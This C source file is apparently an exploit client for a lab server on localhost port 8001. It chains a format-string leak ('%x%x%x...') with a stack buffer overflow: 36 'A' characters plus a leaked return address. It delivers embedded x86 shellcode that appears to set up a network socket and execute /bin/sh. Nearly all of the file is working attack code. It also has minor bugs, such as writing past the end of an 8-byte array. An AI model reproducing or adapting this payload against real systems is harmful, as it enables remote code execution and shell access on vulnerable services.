#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>
#include <netdb.h>
#include <time.h>

#define    PORTNUM    8001
#define    BLENGTH    128
#define    ALENGTH    32
#define    FIRSTINPUTLENGTH 128
#define    SECONDINPUTLENGTH 128

static void
loop(int s)
{    
    char buffer[BLENGTH];
    char name[ALENGTH] = "Akash";
    unsigned char prologue[13] = "%x%x%x%x%x%x\n"; // format string specifiers, to get the base address of the response buffer
    unsigned char firstInput[FIRSTINPUTLENGTH] = "1\n\x89\xe5\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x50\x50\x66\x68\xff\xf0\x66\x6a\x02\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc7\x31\xc0\x66\xb8\x69\x01\x89\xfb\x89\xe1\x89\xea\x29\xe2\xcd\x80\x31\xc0\x66\xb8\x6b\x01\x89\xfb\x31\xc9\xcd\x80\x31\xc0\x66\xb8\x6c\x01\x89\xfb\x31\xc9\x31\xd2\x31\xf6\xcd\x80\x89\xc6\xb1\x03\x31\xc0\xb0\x3f\x89\xf3\x49\xcd\x80\x41\xe2\xf4\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"; //first part of payload (shellcode).
    unsigned char A[36] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"; //Number of A's (36) to overflow the buffer and stack frame pointer.
    unsigned char *secondInput = malloc(SECONDINPUTLENGTH); //2nd part of payload, (36 A's and the starting address of the shellcode)
    unsigned char str[8]; //for storing the string which has the values from the stack after format string attack.
    unsigned char hex[4]; //to store the hex values of the address.
    unsigned char revhex[4]; //to store the values in reverse, this is sent to take care of little endian encoding.
    int i,j,size=8; //local variables for calculations.

    //Sending Name-----------------------------------------------------------------------------------
    /* Send name to server */
    send(s, name, ALENGTH, 0);
   
    /* Receive prompt */
        if (recv(s, (void *)buffer, BLENGTH, 0) != BLENGTH) {
        exit(EXIT_FAILURE);
    }

    /* Display prompt */
    fputs(buffer, stdout);
    //Sending Name----------------------------------------------------------------------------------


    /*Attack begins!!*/


    //sending prologue (format string attack!!)-----------------------------------------------------
    send(s, prologue, strlen(prologue), 0);
   
    /* Receive prompt */
        if (recv(s, (void *)buffer, BLENGTH, 0) != BLENGTH) {
        exit(EXIT_FAILURE);
    }

    /* Display prompt */
    fputs(buffer, stdout);
    //sending prologue- (format string attack!!)----------------------------------------------------





    //Calculations start----------------------------------------------------------------------------
    //getting the base address of response
    strncpy(str, buffer+25, 8);
    str[8] = '\0';


    //converting the string into hex value to use as the address
    for (i = 0; i + 1 < size; i += 2)
    {
       unsigned char c1 = *(str + i);
       unsigned char c2 = *(str + i + 1);
       char buff[] = { c1, c2, 0 };
       auto x = strtol(buff, 0, 16);
       hex[i / 2] = x;
    }
    
    //adding two as offest because of paylaod.
    hex[3] = hex[3] + 2;
 
    //reversing the hex value to take care of little endian encoding 
    revhex[0]=hex[3];
    revhex[1]=hex[2];
    revhex[2]=hex[1];
    revhex[3]=hex[0];
    
    //preparing 2nd part of the payload (Buffer overflow attack!!)
    memcpy(secondInput, A, strlen(A));
    memcpy(secondInput+strlen(A), revhex, strlen(revhex));
    //Calculations end----------------------------------------------------------------------------




    //Sending first input--------------------------------------------------
    /* Send first inptut to server */
    send(s, firstInput, strlen(firstInput), 0);
   
    /* Receive prompt */
        if (recv(s, (void *)buffer, BLENGTH, 0) != BLENGTH) {
        exit(EXIT_FAILURE);
    }

    /* Display prompt */
    fputs(buffer, stdout);
    //Sending first input--------------------------------------------------





    //Sending second input-------------------------------------------------
    /* Send second inptut to server */
    send(s, secondInput, strlen(secondInput), 0);
   
    /* Receive prompt */
        if (recv(s, (void *)buffer, BLENGTH, 0) != BLENGTH) {
        exit(EXIT_FAILURE);
    }

    /* Display prompt */
    fputs(buffer, stdout);
    //Sending second input-------------------------------------------------

    /*Attack success!!*/
 
}

int
main(void)
{
  struct sockaddr_in server;
  struct hostent *host;
  int s;

  /* Create an Internet family, stream socket */
  s = socket(AF_INET, SOCK_STREAM, 0);
  if (s < 0) {
    perror("socket()");
    exit(EXIT_FAILURE);
  }

  /* Server listening on localhost interface */
  if ((host = gethostbyname("localhost")) == NULL) {
    perror("gethostbyname()");
    exit(EXIT_FAILURE);
  }

  /* Fill in socket address */
  memset((char *)&server, '\0', sizeof (server));
  server.sin_family = AF_INET;
  server.sin_port = htons(PORTNUM);
  memcpy((char *)&server.sin_addr, host->h_addr_list[0], host->h_length);

  /* Connect to server */
  if (connect(s, (struct sockaddr *)&server, sizeof (server)) < 0) {
    perror("connect()");
    exit(EXIT_FAILURE);
  }

  /* Talk to server */
  loop(s);

  /* Close the socket */
  close(s);

  return (0);
}
